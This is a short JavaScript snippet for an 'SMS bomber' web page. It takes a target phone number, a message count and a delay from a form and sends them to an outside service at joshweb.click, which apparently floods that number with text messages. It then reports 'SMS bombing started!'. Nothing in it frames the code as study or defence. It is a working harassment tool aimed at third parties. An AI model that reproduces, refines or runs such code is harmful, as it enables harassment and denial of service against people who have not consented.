    function updateDateTime() {
        const now = new Date();
        const dateTimeStr = now.toLocaleString('en-US', { hour12: false });
        document.getElementById('datetime').innerHTML = dateTimeStr;
    }
    setInterval(updateDateTime, 1000);

    function startBombing() {
        const phone = document.getElementById('phone').value;
        const amount = document.getElementById('amount').value;
        const cooldown = document.getElementById('cooldown').value;
        const responseDiv = document.getElementById('response');

        if (phone === '' || amount === '' || cooldown === '') {
            responseDiv.innerHTML = 'Please fill out all fields';
            return;
        }

        fetch(`https://joshweb.click/smsb?number=${phone}&amount=${amount}&delay=${cooldown}`)
            .then(response => response.json())
            .then(data => {
                responseDiv.innerHTML = 'SMS bombing started!';
            })
            .catch(error => {
                responseDiv.innerHTML = 'Error starting SMS bombing';
                console.error('Error:', error);
            });
    }

updateDateTime();